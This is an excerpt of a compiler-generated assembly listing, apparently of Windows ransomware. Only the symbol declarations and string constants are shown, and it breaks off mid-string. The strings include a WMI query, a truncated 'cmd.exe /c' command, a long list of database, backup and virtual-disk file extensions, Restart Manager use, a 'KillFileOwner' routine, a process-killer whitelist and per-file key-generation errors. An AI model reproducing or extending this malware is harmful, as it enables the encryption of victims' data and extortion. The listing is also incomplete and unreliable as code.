; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_1CO@KINCPPDA@?$AA_?$AA_?$AAP?$AAr?$AAo?$AAv?$AAi?$AAd?$AAe?$AAr?$AAA?$AAr?$AAc?$AAh?$AAi@ ; `string'
PUBLIC	??_C@_1BG@BJADHBOD@?$AAR?$AAO?$AAO?$AAT?$AA?2?$AAC?$AAI?$AAM?$AAV?$AA2@ ; `string'
PUBLIC	??_C@_17NDCOOGJO@?$AAW?$AAQ?$AAL@		; `string'
PUBLIC	??_C@_1DO@GDIJLNFO@?$AAS?$AAE?$AAL?$AAE?$AAC?$AAT?$AA?5?$AA?$CK?$AA?5?$AAF?$AAR?$AAO?$AAM?$AA?5?$AAW@ ; `string'
PUBLIC	??_C@_15HCBMMKJC@?$AAI?$AAD@			; `string'
PUBLIC	??_C@_1JO@IHCPLJNE@?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?5?$AA?1?$AAc?$AA?5?$AAC?$AA?3?$AA?2?$AAW@ ; `string'
PUBLIC	??_C@_19GLEHNEHF@?$AA?4?$AA4?$AAd?$AAd@		; `string'
PUBLIC	??_C@_19KOPDPMJK@?$AA?4?$AA4?$AAd?$AAl@		; `string'
PUBLIC	??_C@_1O@PNLCOBOI@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAb@ ; `string'
PUBLIC	??_C@_1O@EFAOIGIN@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAc@ ; `string'
PUBLIC	??_C@_1O@GAGFNJFB@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAe@ ; `string'
PUBLIC	??_C@_1O@KNKLLGHH@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAr@ ; `string'
PUBLIC	??_C@_1O@IIMAOJKL@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAt@ ; `string'
PUBLIC	??_C@_1O@MFAIEIKA@?$AA?4?$AAa?$AAc?$AAc?$AAf?$AAt@ ; `string'
PUBLIC	??_C@_19FDOKHGAL@?$AA?4?$AAa?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19MODNEOLC@?$AA?4?$AAa?$AAd?$AAe@		; `string'
PUBLIC	??_C@_19NMIIOBFM@?$AA?4?$AAa?$AAd?$AAf@		; `string'
PUBLIC	??_C@_19KJPKOJBP@?$AA?4?$AAa?$AAd?$AAp@		; `string'
PUBLIC	??_C@_19DONJPAOI@?$AA?4?$AAa?$AAr?$AAc@		; `string'
PUBLIC	??_C@_19IBFKCKFB@?$AA?4?$AAo?$AAr?$AAa@		; `string'
PUBLIC	??_C@_19DANLGDDB@?$AA?4?$AAa?$AAl?$AAf@		; `string'
PUBLIC	??_C@_19DADBALKC@?$AA?4?$AAa?$AAs?$AAk@		; `string'
PUBLIC	??_C@_19IOKKCEOM@?$AA?4?$AAb?$AAt?$AAr@		; `string'
PUBLIC	??_C@_19FCAHOGLP@?$AA?4?$AAb?$AAd?$AAf@		; `string'
PUBLIC	??_C@_19DEHAOIIG@?$AA?4?$AAc?$AAa?$AAt@		; `string'
PUBLIC	??_C@_19BBMPHBHG@?$AA?4?$AAc?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19BKIJFMLH@?$AA?4?$AAc?$AAk?$AAp@		; `string'
PUBLIC	??_C@_19CEHFIPFA@?$AA?4?$AAc?$AAm?$AAa@		; `string'
PUBLIC	??_C@_19KMODGOCH@?$AA?4?$AAc?$AAp?$AAd@		; `string'
PUBLIC	??_C@_1BA@HOMELDNI@?$AA?4?$AAd?$AAa?$AAc?$AAp?$AAa?$AAc@ ; `string'
PUBLIC	??_C@_19GOKMLGAA@?$AA?4?$AAd?$AAa?$AAd@		; `string'
PUBLIC	??_C@_1BI@PCJHNNLF@?$AA?4?$AAd?$AAa?$AAd?$AAi?$AAa?$AAg?$AAr?$AAa?$AAm?$AAs@ ; `string'
PUBLIC	??_C@_1BE@CMGNDCIB@?$AA?4?$AAd?$AAa?$AAs?$AAc?$AAh?$AAe?$AAm?$AAa@ ; `string'
PUBLIC	??_C@_17HEGLCCDG@?$AA?4?$AAd?$AAb@		; `string'
PUBLIC	??_C@_1BA@MAHGHHCD@?$AA?4?$AAd?$AAb?$AA?9?$AAs?$AAh?$AAm@ ; `string'
PUBLIC	??_C@_1BA@NLIPEPHE@?$AA?4?$AAd?$AAb?$AA?9?$AAw?$AAa?$AAl@ ; `string'
PUBLIC	??_C@_19LOOCPDLF@?$AA?4?$AAd?$AAb?$AA3@		; `string'
PUBLIC	??_C@_19HFOPPMBH@?$AA?4?$AAd?$AAb?$AAc@		; `string'
PUBLIC	??_C@_19ECDBAMCF@?$AA?4?$AAd?$AAb?$AAf@		; `string'
PUBLIC	??_C@_19CFPGKLII@?$AA?4?$AAd?$AAb?$AAs@		; `string'
PUBLIC	??_C@_19LICBJDDB@?$AA?4?$AAd?$AAb?$AAt@		; `string'
PUBLIC	??_C@_19BCCIFLLK@?$AA?4?$AAd?$AAb?$AAv@		; `string'
PUBLIC	??_C@_19PCPHCMIJ@?$AA?4?$AAd?$AAb?$AAx@		; `string'
PUBLIC	??_C@_19GAPEINH@?$AA?4?$AAd?$AAc?$AAb@		; `string'
PUBLIC	??_C@_19HDHNEAJE@?$AA?4?$AAd?$AAc?$AAt@		; `string'
PUBLIC	??_C@_19DJKLPPCM@?$AA?4?$AAd?$AAc?$AAx@		; `string'
PUBLIC	??_C@_19PLNFAPFM@?$AA?4?$AAd?$AAd?$AAl@		; `string'
PUBLIC	??_C@_1M@HMBDHBGI@?$AA?4?$AAd?$AAl?$AAi?$AAs@	; `string'
PUBLIC	??_C@_19FKPFJIKO@?$AA?4?$AAd?$AAp?$AA1@		; `string'
PUBLIC	??_C@_19MPAJDLNJ@?$AA?4?$AAd?$AAq?$AAy@		; `string'
PUBLIC	??_C@_19HINBAFMG@?$AA?4?$AAd?$AAs?$AAk@		; `string'
PUBLIC	??_C@_19EPAPPFPE@?$AA?4?$AAd?$AAs?$AAn@		; `string'
PUBLIC	??_C@_1M@KGABPNAK@?$AA?4?$AAd?$AAt?$AAs?$AAx@	; `string'
PUBLIC	??_C@_19IPMBMNLM@?$AA?4?$AAd?$AAx?$AAl@		; `string'
PUBLIC	??_C@_19DIMPJAJE@?$AA?4?$AAe?$AAc?$AAo@		; `string'
PUBLIC	??_C@_19PFABPPLC@?$AA?4?$AAe?$AAc?$AAx@		; `string'
PUBLIC	??_C@_19NHKAHIPB@?$AA?4?$AAe?$AAd?$AAb@		; `string'
PUBLIC	??_C@_1M@IADBOJO@?$AA?4?$AAe?$AAp?$AAi?$AAm@	; `string'
PUBLIC	??_C@_19KDLELKBB@?$AA?4?$AAe?$AAx?$AAb@		; `string'
PUBLIC	??_C@_19GBEBBAHG@?$AA?4?$AAf?$AAc?$AAd@		; `string'
PUBLIC	??_C@_19FJCPHPBC@?$AA?4?$AAf?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19FNANALKJ@?$AA?4?$AAf?$AAi?$AAc@		; `string'
PUBLIC	??_C@_19IEDALBMO@?$AA?4?$AAf?$AAm?$AAp@		; `string'
PUBLIC	??_C@_1O@PCJJJIPK@?$AA?4?$AAf?$AAm?$AAp?$AA1?$AA2@ ; `string'
PUBLIC	??_C@_1O@JLNLELAM@?$AA?4?$AAf?$AAm?$AAp?$AAs?$AAl@ ; `string'
PUBLIC	??_C@_19NDDHPIOC@?$AA?4?$AAf?$AAo?$AAl@		; `string'
PUBLIC	??_C@_19LCNJFHFI@?$AA?4?$AAf?$AAp?$AA3@		; `string'
PUBLIC	??_C@_19CPAOGPOB@?$AA?4?$AAf?$AAp?$AA4@		; `string'
PUBLIC	??_C@_19JHLCAIIE@?$AA?4?$AAf?$AAp?$AA5@		; `string'
PUBLIC	??_C@_19DNLLMAAP@?$AA?4?$AAf?$AAp?$AA7@		; `string'
PUBLIC	??_C@_19LEBKDHNM@?$AA?4?$AAf?$AAp?$AAt@		; `string'
PUBLIC	??_C@_19NEMDIOMC@?$AA?4?$AAf?$AAr?$AAm@		; `string'
PUBLIC	??_C@_19JFIFHPIM@?$AA?4?$AAg?$AAd?$AAb@		; `string'
PUBLIC	??_C@_1M@KKCOMKFG@?$AA?4?$AAg?$AAr?$AAd?$AAb@	; `string'
PUBLIC	??_C@_19MHMGIILI@?$AA?4?$AAg?$AAw?$AAi@		; `string'
PUBLIC	??_C@_19EMKFGNCA@?$AA?4?$AAh?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19BIJOEOAE@?$AA?4?$AAh?$AAi?$AAs@		; `string'
PUBLIC	??_C@_17MIPFDBOI@?$AA?4?$AAi?$AAb@		; `string'
PUBLIC	??_C@_19IAAPGNLO@?$AA?4?$AAi?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19MIGJBKDO@?$AA?4?$AAi?$AAh?$AAx@		; `string'
PUBLIC	??_C@_1M@HCIIPDGC@?$AA?4?$AAi?$AAt?$AAd?$AAb@	; `string'
PUBLIC	??_C@_19OEBOMIII@?$AA?4?$AAi?$AAt?$AAw@		; `string'
PUBLIC	??_C@_19LAKOLBLL@?$AA?4?$AAj?$AAe?$AAt@		; `string'
PUBLIC	??_C@_19DCPCNPDN@?$AA?4?$AAj?$AAt?$AAx@		; `string'
PUBLIC	??_C@_19MCCKGKMD@?$AA?4?$AAk?$AAd?$AAb@		; `string'
PUBLIC	??_C@_1M@GFHJFHAL@?$AA?4?$AAk?$AAe?$AAx?$AAi@	; `string'
PUBLIC	??_C@_1O@DPGICAAI@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAc@ ; `string'
PUBLIC	??_C@_1O@GPHBHHJH@?$AA?4?$AAk?$AAe?$AAx?$AAi?$AAs@ ; `string'
PUBLIC	??_C@_19PGMHHGBB@?$AA?4?$AAl?$AAg?$AAc@		; `string'
PUBLIC	??_C@_19HCAJKEBE@?$AA?4?$AAl?$AAw?$AAx@		; `string'
PUBLIC	??_C@_19NLOKGFKA@?$AA?4?$AAm?$AAa?$AAf@		; `string'
PUBLIC	??_C@_19BGCEAKIG@?$AA?4?$AAm?$AAa?$AAq@		; `string'
PUBLIC	??_C@_19EJBKFGI@?$AA?4?$AAm?$AAa?$AAr@		; `string'
PUBLIC	??_C@_19LMCNMCAN@?$AA?4?$AAm?$AAa?$AAs@		; `string'
PUBLIC	??_C@_19ILPDDCDP@?$AA?4?$AAm?$AAa?$AAv@		; `string'
PUBLIC	??_C@_19EEFGDEE@?$AA?4?$AAm?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19ILCHPEBD@?$AA?4?$AAm?$AAd?$AAf@		; `string'
PUBLIC	??_C@_19LJGJHMBF@?$AA?4?$AAm?$AAp?$AAd@		; `string'
PUBLIC	??_C@_19OGBEHCPA@?$AA?4?$AAm?$AAr?$AAg@		; `string'
PUBLIC	??_C@_19OJKEONKG@?$AA?4?$AAm?$AAu?$AAd@		; `string'
PUBLIC	??_C@_19IBAHBDHB@?$AA?4?$AAm?$AAw?$AAb@		; `string'
PUBLIC	??_C@_19JOGGCNNN@?$AA?4?$AAm?$AAy?$AAd@		; `string'
PUBLIC	??_C@_19FKIPDPA@?$AA?4?$AAn?$AAd?$AAf@		; `string'
PUBLIC	??_C@_19FOCDEPIC@?$AA?4?$AAn?$AAn?$AAt@		; `string'
PUBLIC	??_C@_1BA@LGEHKHJA@?$AA?4?$AAn?$AAr?$AAm?$AAl?$AAi?$AAb@ ; `string'
PUBLIC	??_C@_19FPBEFJCG@?$AA?4?$AAn?$AAs?$AA2@		; `string'
PUBLIC	??_C@_19OHKIDOED@?$AA?4?$AAn?$AAs?$AA3@		; `string'
PUBLIC	??_C@_19HKHPAGPK@?$AA?4?$AAn?$AAs?$AA4@		; `string'
PUBLIC	??_C@_19BLHLMBND@?$AA?4?$AAn?$AAs?$AAf@		; `string'
PUBLIC	??_C@_17KILMBJI@?$AA?4?$AAn?$AAv@		; `string'
PUBLIC	??_C@_19PNJMIJF@?$AA?4?$AAn?$AAv?$AA2@		; `string'
PUBLIC	??_C@_1M@BONLOPPI@?$AA?4?$AAn?$AAw?$AAd?$AAb@	; `string'
PUBLIC	??_C@_19LKOAOCLF@?$AA?4?$AAn?$AAy?$AAf@		; `string'
PUBLIC	??_C@_19EGGAGEDJ@?$AA?4?$AAo?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19JCGDCHIP@?$AA?4?$AAo?$AAq?$AAy@		; `string'
PUBLIC	??_C@_19KMELDCEE@?$AA?4?$AAo?$AAr?$AAx@		; `string'
PUBLIC	??_C@_19HLJOHDGJ@?$AA?4?$AAo?$AAw?$AAc@		; `string'
PUBLIC	??_C@_19BHIEMEGC@?$AA?4?$AAp?$AA9?$AA6@		; `string'
PUBLIC	??_C@_19KPDIKDAH@?$AA?4?$AAp?$AA9?$AA7@		; `string'
PUBLIC	??_C@_19PJOAGJLF@?$AA?4?$AAp?$AAa?$AAn@		; `string'
PUBLIC	??_C@_19ODPLEHLO@?$AA?4?$AAp?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19LLJIFHOI@?$AA?4?$AAp?$AAd?$AAm@		; `string'
PUBLIC	??_C@_19NHMNBLKI@?$AA?4?$AAp?$AAn?$AAz@		; `string'
PUBLIC	??_C@_19HNMGHGDI@?$AA?4?$AAq?$AAr?$AAy@		; `string'
PUBLIC	??_C@_19EECELLGM@?$AA?4?$AAq?$AAv?$AAd@		; `string'
PUBLIC	??_C@_19PIOFDEIJ@?$AA?4?$AAr?$AAb?$AAf@		; `string'
PUBLIC	??_C@_1M@PNAFOMAI@?$AA?4?$AAr?$AAc?$AAt?$AAd@	; `string'
PUBLIC	??_C@_19OOHCOPNM@?$AA?4?$AAr?$AAo?$AAd@		; `string'
PUBLIC	??_C@_1M@LDLDBDPL@?$AA?4?$AAr?$AAo?$AAd?$AAx@	; `string'
PUBLIC	??_C@_19BMPCFPJC@?$AA?4?$AAr?$AAp?$AAd@		; `string'
PUBLIC	??_C@_19JKGGCNDM@?$AA?4?$AAr?$AAs?$AAd@		; `string'
PUBLIC	??_C@_1BE@BHBAPCAP@?$AA?4?$AAs?$AAa?$AAs?$AA7?$AAb?$AAd?$AAa?$AAt@ ; `string'
PUBLIC	??_C@_19DEEPDEBH@?$AA?4?$AAs?$AAb?$AAf@		; `string'
PUBLIC	??_C@_19EPNFMHBO@?$AA?4?$AAs?$AAc?$AAx@		; `string'
PUBLIC	??_C@_19GNHEEAFN@?$AA?4?$AAs?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19NFMICHDI@?$AA?4?$AAs?$AAd?$AAc@		; `string'
PUBLIC	??_C@_19OCBGNHAK@?$AA?4?$AAs?$AAd?$AAf@		; `string'
PUBLIC	??_C@_19DJEPGDHJ@?$AA?4?$AAs?$AAi?$AAs@		; `string'
PUBLIC	??_C@_19LHJPPIKB@?$AA?4?$AAs?$AAp?$AAq@		; `string'
PUBLIC	??_C@_19NOLAKEEG@?$AA?4?$AAs?$AAq?$AAl@		; `string'
PUBLIC	??_C@_1BA@JFCMHFPB@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe@ ; `string'
PUBLIC	??_C@_1BC@MPFGJHCM@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AA3@ ; `string'
PUBLIC	??_C@_1BE@NHPOKFNI@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AAd?$AAb@ ; `string'
PUBLIC	??_C@_17OKGKBIBE@?$AA?4?$AAt?$AAe@		; `string'
PUBLIC	??_C@_1M@IGCCOLM@?$AA?4?$AAt?$AAe?$AAm?$AAx@	; `string'
PUBLIC	??_C@_19GFNFEHFA@?$AA?4?$AAt?$AAm?$AAd@		; `string'
PUBLIC	??_C@_19BHFDDJDD@?$AA?4?$AAt?$AAp?$AAs@		; `string'
PUBLIC	??_C@_19KICMPKH@?$AA?4?$AAt?$AAr?$AAc@		; `string'
PUBLIC	??_C@_19OKFNLIJE@?$AA?4?$AAt?$AAr?$AAm@		; `string'
PUBLIC	??_C@_19KLBLEJNK@?$AA?4?$AAu?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19ELMEDOOJ@?$AA?4?$AAu?$AAd?$AAl@		; `string'
PUBLIC	??_C@_19OFNBCMGG@?$AA?4?$AAu?$AAs?$AAr@		; `string'
PUBLIC	??_C@_19LCNKNINP@?$AA?4?$AAv?$AA1?$AA2@		; `string'
PUBLIC	??_C@_19HBKPGNBN@?$AA?4?$AAv?$AAi?$AAs@		; `string'
PUBLIC	??_C@_19JILIFBGI@?$AA?4?$AAv?$AAp?$AAd@		; `string'
PUBLIC	??_C@_19LEPBCNGB@?$AA?4?$AAv?$AAv?$AAv@		; `string'
PUBLIC	??_C@_19OJDOEOKH@?$AA?4?$AAw?$AAd?$AAb@		; `string'
PUBLIC	??_C@_1M@CIBLGIDJ@?$AA?4?$AAw?$AAm?$AAd?$AAb@	; `string'
PUBLIC	??_C@_19EBLJOAKL@?$AA?4?$AAw?$AAr?$AAk@		; `string'
PUBLIC	??_C@_19DABOFMAL@?$AA?4?$AAx?$AAd?$AAb@		; `string'
PUBLIC	??_C@_19PJCGIBLK@?$AA?4?$AAx?$AAl?$AAd@		; `string'
PUBLIC	??_C@_1O@GJEACCMG@?$AA?4?$AAx?$AAm?$AAl?$AAf?$AAf@ ; `string'
PUBLIC	??_C@_1BA@JNHJMGEC@?$AA?4?$AAa?$AAb?$AAc?$AAd?$AAd?$AAb@ ; `string'
PUBLIC	??_C@_19GNBGKFOM@?$AA?4?$AAa?$AAb?$AAs@		; `string'
PUBLIC	??_C@_19LKBHCCON@?$AA?4?$AAa?$AAb?$AAx@		; `string'
PUBLIC	??_C@_1O@JKHFEGEF@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAw@ ; `string'
PUBLIC	??_C@_19BJDMMJLD@?$AA?4?$AAa?$AAd?$AAn@		; `string'
PUBLIC	??_C@_19GFOJENA@?$AA?4?$AAd?$AAb?$AA2@		; `string'
PUBLIC	??_C@_19CIPKBJMB@?$AA?4?$AAf?$AAm?$AA5@		; `string'
PUBLIC	??_C@_19DNNAEBD@?$AA?4?$AAh?$AAj?$AAt@		; `string'
PUBLIC	??_C@_19KKNEKNDE@?$AA?4?$AAi?$AAc?$AAg@		; `string'
PUBLIC	??_C@_19MNBDAKJJ@?$AA?4?$AAi?$AAc?$AAr@		; `string'
PUBLIC	??_C@_19HFBHLKKH@?$AA?4?$AAl?$AAu?$AAt@		; `string'
PUBLIC	??_C@_19DDEPFFFK@?$AA?4?$AAm?$AAa?$AAw@		; `string'
PUBLIC	??_C@_19EOJDNMPM@?$AA?4?$AAm?$AAd?$AAn@		; `string'
PUBLIC	??_C@_19HBDHGLAH@?$AA?4?$AAm?$AAd?$AAt@		; `string'
PUBLIC	??_C@_19PCJFMJDI@?$AA?4?$AAv?$AAd?$AAi@		; `string'
PUBLIC	??_C@_19HHDNNBJO@?$AA?4?$AAv?$AAh?$AAd@		; `string'
PUBLIC	??_C@_1M@LKNBEMIN@?$AA?4?$AAv?$AAm?$AAd?$AAk@	; `string'
PUBLIC	??_C@_19PFIGPEHI@?$AA?4?$AAp?$AAv?$AAm@		; `string'
PUBLIC	??_C@_1M@FEOGMAPE@?$AA?4?$AAv?$AAm?$AAe?$AAm@	; `string'
PUBLIC	??_C@_1M@JDNMIOJM@?$AA?4?$AAv?$AAm?$AAs?$AAn@	; `string'
PUBLIC	??_C@_1M@PMGBGOPI@?$AA?4?$AAv?$AAm?$AAs?$AAd@	; `string'
PUBLIC	??_C@_1O@PGBOIEGF@?$AA?4?$AAn?$AAv?$AAr?$AAa?$AAm@ ; `string'
PUBLIC	??_C@_19DNDPKIAK@?$AA?4?$AAv?$AAm?$AAx@		; `string'
PUBLIC	??_C@_19JGNEHGNN@?$AA?4?$AAr?$AAa?$AAw@		; `string'
PUBLIC	??_C@_1O@OIEKGGMM@?$AA?4?$AAq?$AAc?$AAo?$AAw?$AA2@ ; `string'
PUBLIC	??_C@_1BA@DJGBOAGI@?$AA?4?$AAs?$AAu?$AAb?$AAv?$AAo?$AAl@ ; `string'
PUBLIC	??_C@_19CLCNNNIO@?$AA?4?$AAb?$AAi?$AAn@		; `string'
PUBLIC	??_C@_19OEDMLMNC@?$AA?4?$AAv?$AAs?$AAv@		; `string'
PUBLIC	??_C@_1M@HBNDCLEM@?$AA?4?$AAa?$AAv?$AAh?$AAd@	; `string'
PUBLIC	??_C@_1M@PKPDNCHL@?$AA?4?$AAv?$AAm?$AAr?$AAs@	; `string'
PUBLIC	??_C@_1M@LAJNLKJI@?$AA?4?$AAv?$AAh?$AAd?$AAx@	; `string'
PUBLIC	??_C@_1M@BMNOADBA@?$AA?4?$AAa?$AAv?$AAd?$AAx@	; `string'
PUBLIC	??_C@_1M@OFHIIEEE@?$AA?4?$AAv?$AAm?$AAc?$AAx@	; `string'
PUBLIC	??_C@_19GMLGIHEA@?$AA?4?$AAi?$AAs?$AAo@		; `string'
PUBLIC	??_C@_1DI@LNFEJEN@?$AAR?$AAe?$AAs?$AAt?$AAa?$AAr?$AAt?$AA?5?$AAm?$AAa?$AAn?$AAa?$AAg?$AAe?$AAr@ ; `string'
PUBLIC	??_C@_1GA@FDHIJDFN@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAw?$AAr?$AAi?$AAt?$AAe?$AA?5?$AAk?$AAe?$AAy@ ; `string'
PUBLIC	??_C@_1FI@MBMGEOBK@?$AAF?$AAi?$AAl?$AAe?$AA?5?$AA?$CF?$AAs?$AA?5?$AAi?$AAs?$AA?5?$AAa?$AAl?$AAr?$AAe@ ; `string'
PUBLIC	??_C@_1EI@GAAPJCEJ@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_1EO@DJMLGHEK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAo?$AAp?$AAe?$AAn?$AA?5?$AAf?$AAi?$AAl?$AAe@ ; `string'
PUBLIC	??_C@_1GO@BBIBAKLB@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_1FG@BEPDFPEB@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAf?$AAi?$AAl?$AAe?$AA?5@ ; `string'
PUBLIC	??_C@_1FM@CFJJADAK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAn?$AA?5?$AAk?$AAe?$AAy?$AA?5?$AAf@ ; `string'
PUBLIC	?g_WhitelistPids@@3PEAUPID_LIST@process_killer@@EA ; g_WhitelistPids
EXTRN	CLSID_WbemLocator:BYTE
EXTRN	CLSID_WbemContext:BYTE
EXTRN	__imp_CloseHandle:PROC
EXTRN	IID_IWbemLocator:BYTE
EXTRN	__imp_wsprintfW:PROC
EXTRN	IID_IWbemContext:BYTE
?g_WhitelistPids@@3PEAUPID_LIST@process_killer@@EA DQ 01H DUP (?) ; g_WhitelistPids
_BSS	ENDS
;	COMDAT ??_C@_1FM@CFJJADAK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAn?$AA?5?$AAk?$AAe?$AAy?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1FM@CFJJADAK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAn?$AA?5?$AAk?$AAe?$AAy?$AA?5?$AAf@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 'n', 00H, ' ', 00H, 'k', 00H, 'e', 00H, 'y', 00H, ' '
	DB	00H, 'f', 00H, 'o', 00H, 'r', 00H, ' ', 00H, 'f', 00H, 'i', 00H
	DB	'l', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's', 00H, '.', 00H, ' '
	DB	00H, 'G', 00H, 'e', 00H, 't', 00H, 'L', 00H, 'a', 00H, 's', 00H
	DB	't', 00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' '
	DB	00H, '=', 00H, ' ', 00H, '%', 00H, 'l', 00H, 'u', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1FG@BEPDFPEB@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAf?$AAi?$AAl?$AAe?$AA?5@
CONST	SEGMENT
??_C@_1FG@BEPDFPEB@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAf?$AAi?$AAl?$AAe?$AA?5@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 't', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l', 00H, 'e'
	DB	00H, ' ', 00H, 's', 00H, 'i', 00H, 'z', 00H, 'e', 00H, ' ', 00H
	DB	'%', 00H, 's', 00H, '.', 00H, ' ', 00H, 'G', 00H, 'e', 00H, 't'
	DB	00H, 'L', 00H, 'a', 00H, 's', 00H, 't', 00H, 'E', 00H, 'r', 00H
	DB	'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H, '=', 00H, ' ', 00H, '%'
	DB	00H, 'l', 00H, 'u', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_1GO@BBIBAKLB@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1GO@BBIBAKLB@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@ DB 'K'
	DB	00H, 'i', 00H, 'l', 00H, 'l', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'O', 00H, 'w', 00H, 'n', 00H, 'e', 00H, 'r', 00H, ' '
	DB	00H, 'f', 00H, 'o', 00H, 'r', 00H, ' ', 00H, 'f', 00H, 'i', 00H
	DB	'l', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's', 00H, ' ', 00H, '-'
	DB	00H, ' ', 00H, 'e', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H
	DB	'.', 00H, ' ', 00H, 'G', 00H, 'e', 00H, 't', 00H, 'L', 00H, 'a'
	DB	00H, 's', 00H, 't', 00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H
	DB	'r', 00H, ' ', 00H, '=', 00H, ' ', 00H, '%', 00H, 'l', 00H, 'u'
	DB	00H, '.', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1EO@DJMLGHEK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAo?$AAp?$AAe?$AAn?$AA?5?$AAf?$AAi?$AAl?$AAe@
CONST	SEGMENT
??_C@_1EO@DJMLGHEK@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAo?$AAp?$AAe?$AAn?$AA?5?$AAf?$AAi?$AAl?$AAe@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'o', 00H
	DB	'p', 00H, 'e', 00H, 'n', 00H, ' ', 00H, 'f', 00H, 'i', 00H, 'l'
	DB	00H, 'e', 00H, ' ', 00H, '%', 00H, 's', 00H, '.', 00H, ' ', 00H
	DB	'G', 00H, 'e', 00H, 't', 00H, 'L', 00H, 'a', 00H, 's', 00H, 't'
	DB	00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'=', 00H, ' ', 00H, '%', 00H, 'l', 00H, 'u', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1EI@GAAPJCEJ@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1EI@GAAPJCEJ@?$AAK?$AAi?$AAl?$AAl?$AAF?$AAi?$AAl?$AAe?$AAO?$AAw?$AAn?$AAe?$AAr?$AA?5?$AAf@ DB 'K'
	DB	00H, 'i', 00H, 'l', 00H, 'l', 00H, 'F', 00H, 'i', 00H, 'l', 00H
	DB	'e', 00H, 'O', 00H, 'w', 00H, 'n', 00H, 'e', 00H, 'r', 00H, ' '
	DB	00H, 'f', 00H, 'o', 00H, 'r', 00H, ' ', 00H, 'f', 00H, 'i', 00H
	DB	'l', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's', 00H, ' ', 00H, '-'
	DB	00H, ' ', 00H, 's', 00H, 'u', 00H, 'c', 00H, 'c', 00H, 'e', 00H
	DB	's', 00H, 's', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1FI@MBMGEOBK@?$AAF?$AAi?$AAl?$AAe?$AA?5?$AA?$CF?$AAs?$AA?5?$AAi?$AAs?$AA?5?$AAa?$AAl?$AAr?$AAe@
CONST	SEGMENT
??_C@_1FI@MBMGEOBK@?$AAF?$AAi?$AAl?$AAe?$AA?5?$AA?$CF?$AAs?$AA?5?$AAi?$AAs?$AA?5?$AAa?$AAl?$AAr?$AAe@ DB 'F'
	DB	00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's', 00H
